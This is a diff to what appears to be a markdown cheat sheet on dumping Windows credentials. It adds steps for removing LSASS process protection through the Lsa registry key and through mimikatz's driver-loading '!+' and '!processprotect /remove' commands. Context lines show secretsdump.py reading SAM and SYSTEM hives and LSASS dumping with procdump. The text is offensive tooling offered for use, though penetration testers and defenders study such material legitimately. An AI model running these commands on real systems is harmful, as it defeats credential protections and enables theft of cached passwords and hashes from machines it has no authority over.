@@ -39,6 +39,17 @@ secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
 ```
 
 # 5-Dump LSASS(cached credentials):
+  - **Protected LSASS**:
+    - disable from Registry:
+    ```
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
+    ```
+    - disable with mimikatz:
+    ```
+    mimikatz # !+
+    mimikatz # !processprotect /process:lsass.exe /remove
+    ```
+
   - 5.1-Using GUI with Task-Manager
   - 5.2-Using procdump
   ```
